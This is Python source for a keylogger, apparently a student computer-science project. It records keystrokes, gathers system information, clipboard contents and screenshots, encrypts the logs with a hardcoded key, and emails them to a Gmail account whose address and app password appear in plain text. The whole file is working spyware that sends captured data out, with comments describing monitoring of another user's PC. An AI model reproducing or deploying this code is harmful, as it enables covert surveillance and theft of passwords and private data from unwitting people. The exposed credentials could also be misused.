from pynput.keyboard import Key, Listener
import time
import schedule
import keylog
from cryptography.fernet import Fernet

count = 0
keys = []

key_log = "log.txt"
file_path = "C:\\Users\\casey\\Documents\\comp sci\\keylogger" 
extend = "\\"

# variable declarations for system info
system_info = "system.txt"

# variable declaration for clipboard
clipboard_info = "clipboard.txt"

# variable declaration for screenshot
screenshot_info = "screenshot.png"

#encrypted files declaration
ekey_log = "ekey_log.txt"
esys_info = "esys_info.txt"
eclip_info = "eclip_info.txt"

#variable declaration for email
email_address = "keyclog@gmail.com"
password = "zplhvxysqwztdygc"
to_addr = "keyclog@gmail.com"

currTime = time.time()

# basic key logger functionality
def keylogged(oldtime): 

    def on_press(key):
        global keys, count, currTime

        keys.append(key)
        count += 1
        # debugging purposes
        print("{0} pressed".format(key))
        currTime = time.time()

        if count > 0:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_path + extend + key_log, "a") as file:
            for key in keys:
                # getting rid of ' from the string
                k = str(key).replace("'", "")
                # getting rid of spaces
                if k.find("space") > 0:
                    file.write('\n')
                    file.close()
                elif k.find("Key") == -1:
                    file.write(k)
                    file.close()


    def on_release(key):
        #print("on release: ")
        #print(oldtime)
        #print (" ")
        print("on release" + str(currTime) )
        if key == Key.esc:
            return False
        if ( currTime - oldtime > 59 ):
            return False

    ## on_press = key is press on_release = key is released
    with Listener(on_press=on_press, on_release = on_release) as listener:
        listener.join()
    
    # sending screenshot to email
    keylog.screenshot()
    keylog.send_email(screenshot_info, file_path + extend + screenshot_info, to_addr)

    # sending clipboard to email
    keylog.copy_clipboard()
    keylog.send_email(clipboard_info, file_path + extend + clipboard_info, to_addr)

    keylog.send_email(key_log, file_path + extend + key_log, to_addr)


def main():
    # clearing computer info
    with open(file_path + extend + system_info, "w") as sys_file:
        sys_file.write(" ")
    # get computer information
    keylog.comp_info()
    keylog.send_email(system_info, file_path + extend + system_info, to_addr)

    # variable to hold count to keep while loop in check
    countMin = 0
    # variable to keep track of how many minutes we monitor their pc
    minutes = 1

    # key for encrypting
    key = "7LBG7bqMkRqedGjS3h717rgono_TlKbRaxZVBzGCZXM="

    # will continue to read the users computer for specified minutes
    while countMin < minutes:
        
        # every minute perform keylogging functions
        #schedule.every(2).minute.do(keylogged)
        
        # clearing the clipboard info
        with open(file_path + extend + clipboard_info, "w") as clip_file:
            clip_file.write(" ")
        
        # clearing the log file
        with open(file_path + extend + key_log, "w") as file:
            file.write(" ")
        
        oldtime = time.time()
        print("before sleep time: " + str(oldtime) )

        keylogged(oldtime)

        # increment counter
        
        # time.sleep(60)
        
        newtime = time.time()
        print("\n")
        print("after sleep time: " + str(newtime) )
        
        # increment counter
        countMin += 1
        print(countMin)
    
    files = [file_path + extend + system_info, file_path + extend + clipboard_info, file_path + extend + key_log]
    encrypted_file = [file_path + extend + esys_info, file_path + extend + eclip_info, file_path + extend + ekey_log]

    fileCount = 0

    # encrypting the files
    for efiles in files:
        with open(files[fileCount], 'rb') as file:
            data = file.read()

        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)

        with open(encrypted_file[fileCount], 'wb') as file:
            file.write(encrypted)

        keylog.send_email(encrypted_file[fileCount], encrypted_file[fileCount], to_addr)
        fileCount += 1

if __name__ == '__main__':
    main()


